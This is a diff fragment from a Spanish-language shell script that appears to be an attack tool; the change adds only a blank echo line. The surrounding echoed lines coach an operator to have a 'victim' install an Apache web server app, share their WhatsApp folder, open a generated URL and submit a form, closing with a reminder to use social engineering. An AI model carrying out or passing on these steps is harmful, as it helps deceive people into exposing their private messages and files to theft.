@@ -686,6 +686,7 @@ echo -e "\e[1;32;41my dile a la victima que instale apache web server de la play
 echo -e "\e[1;32;41my que abra y elija la carpeta web en la opcion interna , luego marque la carpeta WhatsApp\e[0m"
 echo -e "\e[1;32;41my que abra la url que se le genero y listo dile que llene el formulario y ponga enviar\e[0m"
 echo -e "\e[1;35;42mRecuerda:\e[0m usar Ingenieria social"
+echo ""
 
 rm -r Encuesta
 
